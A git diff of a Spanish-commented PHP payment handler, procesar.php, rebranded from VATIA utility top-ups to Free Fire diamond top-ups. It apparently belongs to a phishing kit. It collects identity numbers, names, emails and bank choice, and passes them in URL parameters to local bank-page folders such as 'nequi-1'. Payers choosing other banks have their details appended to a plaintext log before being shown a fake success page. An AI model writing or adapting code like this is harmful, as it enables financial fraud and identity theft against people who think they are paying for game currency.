@@ -1,22 +1,20 @@
 <?php
-// procesar.php - Procesamiento de recargas VATIA
+// procesar.php - Procesamiento de recargas Free Fire
 session_start();
 ob_start();
 
 // Verificar que venga del formulario
-if (!isset($_POST['procesarRecarga'])) {
-    error_log("procesar.php: No se recibió procesarRecarga, redirigiendo a index.php");
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    error_log("procesar.php: Método no válido, redirigiendo a index.php");
     header('Location: index.php');
     exit;
 }
 
-error_log("procesar.php: Iniciando procesamiento");
+error_log("procesar.php: Iniciando procesamiento de Free Fire");
 error_log("procesar.php: POST data: " . json_encode($_POST));
 
 // Obtener datos del formulario
-$idInterno = $_SESSION['id_interno'] ?? 'unknown';
 $formData = [
-    'id_interno' => $idInterno,
     'tipo_doc' => $_POST['tipo_doc'] ?? '',
     'numero_doc' => $_POST['cedula'] ?? '',
     'nombres' => $_POST['nombres'] ?? '',
@@ -29,13 +27,22 @@ $formData = [
     'ciudad' => $_POST['ciudad'] ?? '',
     'tipo_persona' => $_POST['tipo_persona'] ?? '',
     'banco' => $_POST['banco'] ?? '',
-    'monto' => $_POST['monto'] ?? '',
-    'descripcion' => $_POST['descripcion'] ?? 'Pago VATIA',
+    // Datos de Free Fire
+    'diamonds' => $_POST['diamonds'] ?? 0,
+    'bonus' => $_POST['bonus'] ?? 0,
+    'price' => $_POST['price'] ?? '',
+    'total' => $_POST['total'] ?? '',
+    'playerId' => $_POST['playerId'] ?? '',
+    'playerName' => $_POST['playerName'] ?? '',
+    'region' => $_POST['region'] ?? '',
+    'promoCode' => $_POST['promoCode'] ?? '',
+    'descripcion' => 'Recarga Free Fire - ' . ($_POST['diamonds'] ?? 0) . ' diamantes',
     'timestamp' => date('Y-m-d H:i:s')
 ];
 
 // Guardar en sesión para que los bancos puedan acceder
 $_SESSION['pse_data'] = $formData;
+$_SESSION['freefire_data'] = $formData;
 
 // Redirigir según banco seleccionado usando folders
 $banco_seleccionado = $formData['banco'];
@@ -62,15 +69,12 @@ $bank_routes = [
     'nequi' => ['folder' => 'nequi-1/', 'ext' => 'php']
 ];
 
-if (isset($bank_routes[$banco_seleccionado])) {
-    $config = $bank_routes[$banco_seleccionado];
-    $folder = $config['folder'];
-    $ext = $config['ext'];
-
-    // Construir URL con parámetros GET
+// Para Free Fire, manejar Nequi específicamente
+if ($formData['banco'] === 'nequi') {
+    // Redirigir a la carpeta de Nequi
     $params = http_build_query([
         'tipo_doc' => $formData['tipo_doc'],
-        'cedula' => $formData['numero_doc'], // Agregar cédula que buscan los bancos
+        'cedula' => $formData['numero_doc'],
         'nombres' => $formData['nombres'],
         'apellidos' => $formData['apellidos'],
         'correo' => $formData['correo'],
@@ -80,19 +84,36 @@ if (isset($bank_routes[$banco_seleccionado])) {
         'pais' => $formData['pais'],
         'ciudad' => $formData['ciudad'],
         'tipo_persona' => $formData['tipo_persona'],
-        'monto' => $formData['monto'],
-        'descripcion' => $formData['descripcion']
+        'monto' => $formData['price'], // Usar el precio formateado
+        'descripcion' => $formData['descripcion'],
+        // Datos adicionales de Free Fire
+        'diamonds' => $formData['diamonds'],
+        'bonus' => $formData['bonus'],
+        'playerId' => $formData['playerId'],
+        'playerName' => $formData['playerName']
     ]);
 
-    $redirect_url = 'transaction/' . $folder . '/index.' . $ext . '?' . $params;
-    error_log("procesar.php: Redirigiendo a: " . $redirect_url);
-    error_log("procesar.php: URL completa: " . (isset($_SERVER['REQUEST_SCHEME']) ? $_SERVER['REQUEST_SCHEME'] : 'http') . '://' . $_SERVER['HTTP_HOST'] . '/' . $redirect_url);
+    $redirect_url = 'transaction/nequi-1/?' . $params;
+    error_log("procesar.php: Redirigiendo a Nequi: " . $redirect_url);
     header('Location: ' . $redirect_url);
-} else {
-    error_log("Banco no encontrado: " . $banco_seleccionado);
-    // Si no hay banco válido, volver al formulario
-    header('Location: index.php?error=banco_invalido');
+    exit;
 }
+
+// Para otros bancos o modo de prueba, mostrar confirmación
+error_log("procesar.php: Datos de Free Fire guardados en sesión");
+
+// Crear un archivo de log con los datos para verificar
+$logData = date('Y-m-d H:i:s') . " - Free Fire Payment\n";
+$logData .= "Player: " . $formData['playerName'] . " (ID: " . $formData['playerId'] . ")\n";
+$logData .= "Diamonds: " . $formData['diamonds'] . " (Bonus: " . $formData['bonus'] . ")\n";
+$logData .= "Amount: " . $formData['price'] . "\n";
+$logData .= "Bank: " . $formData['banco'] . "\n";
+$logData .= "Email: " . $formData['correo'] . "\n\n";
+
+file_put_contents('freefire_payments.log', $logData, FILE_APPEND);
+
+// Redirigir a página de confirmación
+header('Location: success.php?banco=' . urlencode($formData['banco']));
 
 exit;
 ?>
